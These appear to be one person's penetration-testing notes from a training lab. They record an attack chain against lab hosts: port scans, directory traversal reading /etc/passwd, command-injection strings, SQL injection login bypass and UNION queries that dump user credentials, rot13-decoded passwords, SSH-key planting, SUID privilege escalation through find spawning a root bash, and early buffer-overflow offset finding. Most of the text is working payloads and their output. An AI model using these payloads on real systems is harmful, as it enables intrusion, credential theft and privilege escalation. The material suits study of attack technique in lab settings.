

```bash
DO NOT USE IP ADDRESS 10.50.12.194

Host discovery
host enum

============
10.50.12.194
============

nmap -sT -Pn 10.50.12.192 --open

22 
80
--script http-enum
| http-enum: 
|   /login.php: Possible admin folder
|   /login.html: Possible admin folder
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'

robots.txt  - not found
view source page

input 
directory trav
../../../../../../../etc/passwd
	user2:x:1002:1003::/home/user2:/bin/sh
	www-data
	root
../../../../../../../etc/hosts
	192.168.28.175 BestWebApp
	for i in {2..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done

command injection
; ls -la
; ls -la /var/www/html




system_user=user2
user_password=TurkeyDay24

Array
(
    [0] => user2
    [name] => user2
    [1] => GhexrlQnl24
    [pass] => GhexrlQnl24
)
1Array
(
    [0] => user3
    [name] => user3
    [1] => Obo4GURCva3nccyrf		Bob4THEPin3apples
    [pass] => Obo4GURCva3nccyrf
)
1Array
(
    [0] => Lee_Roth
    [name] => Lee_Roth
    [1] => nabgurecnffjbeq4GURntrf	anotherpassword4THEages
    [pass] => nabgurecnffjbeq4GURntrf

64 bytes from 192.168.28.165: icmp_seq=1 ttl=63 time=1.95 ms
64 bytes from 192.168.28.175: icmp_seq=1 ttl=63 time=2.02 ms


==============
192.168.28.175
==============

Sql injection method
3 columns
or 1=1
union select 1,2,3
192.168.28.175:8000/pick.php?product=7 union select 1,2,3
192.168.28.175:8000/pick.php?product=7 union select 1,2,@@version
192.168.28.175:8000/pick.php?product=7 union select table_schema,table_name,column_name from information_schema.columns
ALWAYS IGNORE THE FIRST RESULT

information_schema
mysql
performance_schema

192.168.28.175:8000/pick.php?product=7 union select user_id,name,username from siteusers.user
					select 1,2,3 	  from	database.table
appleBottomJ3an$  Aaron

union select 1,2,3



64 bytes from 192.168.28.189: icmp_seq=1 ttl=128 time=9.11 ms


linux priv escalation

sudo -l 
find / -type f -perm /4000 -ls 2>/dev/null # Find SUID only files
find / -type f -perm /2000 -ls 2>/dev/null # Find SUID only files
gtfobins
give command absolute path
#GG #yolo420noscope
```

```bash
=============
Target 1
=============
10.50.11.253

nmap -sT -Pn 10.50.11.253 --open

| http-enum: 
|   /login.php: Possible admin folder
|   /login.html: Possible admin folder
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'

no robots.txt

Input boxes 

File to read ( directory trav ) ( maybe )
../../../../../../../../etc/passwd
../../../../../../../../etc/hosts

user2:x:1002:1003::/home/user2:/bin/sh
root
www-data
192.168.28.175 BestWebApp


System command ( ping, etc ) ( command injection maybe )
; ls -la 
; whoami
; cat /etc/passwd
; ls -la /var/www/html


Username and password ( sql injection maybe )

system_user=user2
user_password=TurkeyDay24


Sql injection ) POST AND GET METHOD )
username tom' or 1='1
password tom' or 1='1

Array
(
    [0] => user2
    [name] => user2
    [1] => GhexrlQnl24
    [pass] => GhexrlQnl24
)
1Array
(
    [0] => user3
    [name] => user3
    [1] => Obo4GURCva3nccyrf
    [pass] => Obo4GURCva3nccyrf
)
1Array
(
    [0] => Lee_Roth
    [name] => Lee_Roth
    [1] => nabgurecnffjbeq4GURntrf
    [pass] => nabgurecnffjbeq4GURntrf

Two types of encoding Base64 and rot13
TurkeyDay24
Bob4THEPin3apples
anotherpassword4THEages


ssh-rsa key
has to be in the users home dir we are running as ( whoami ) www-data
mkdir /var/www/.ssh
echo ""

cat /etc/hosts

For loop
64 bytes from 192.168.28.165: icmp_seq=1 ttl=63 time=2.54 ms
64 bytes from 192.168.28.175: icmp_seq=1 ttl=63 time=2.60 ms



=============
Target 2 .175
=============
port 8000 http-alt open


Sql injection method
Number of columns  ( 3 columns )
Get url bar
or 1=1
http://192.168.28.175:8000/pick.php?product=1 or 1=1
http://192.168.28.175:8000/pick.php?product=7 union select 1,2,3
http://192.168.28.175:8000/pick.php?product=7 union select table_schema,table_name,column_name from information_schema.columns

( first row we ignore )
information_schema
performance_schema     IGNOREEEEE
mysql 

http://192.168.28.175:8000/pick.php?product=7 union select user_id,name,username from siteusers.users

==========
Extra info
==========
http://192.168.28.175:8000/pick.php?product=7 union select table_schema,table_name,column_name from information_schema.columns
http://192.168.28.175:8000/pick.php?product=7 union select 1,2,@@version




1 	nccyrObggbzW3na$ 	$Aaron  appleBottomJ3an$
2 	GhexrlQnl24 	$user2
3 	Obo4GURCva3nccyrf 	$user3
4 	Lroth 	$Lee_Roth
4 	nabgurecnffjbeq4GURntrf 	$Lroth

union select 1,2,3 ( columns ) from database.table


 1 |   2     |    3      | 4


----- 1

----- 2

----- 3 

siteusers
user
username



siteusers
user
user_id


siteusers
user
random


siteusers
cars
tires

  user_id,username,random from siteusers.user
========================================================================



================
Target 3 Round
================
64 bytes from 192.168.28.189: icmp_seq=1 ttl=128 time=0.560 ms

Priv escalation

sudo -l
find / -type f -perm /4000 -ls 2>/dev/null
find / -type f -perm /2000 -ls 2>/dev/null
gtfobins
(search for file and function used ) suid or sudo
./find . -exec /bin/bash -p \; -quit    ( change to absolute path )
/usr/bin/find . -exec /bin/bash -p \; -quit


Exploit dev
gdb <binary>
r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
did we overright eip with A's?
wiremask
r <random char> , look at reg value on site get offset

```

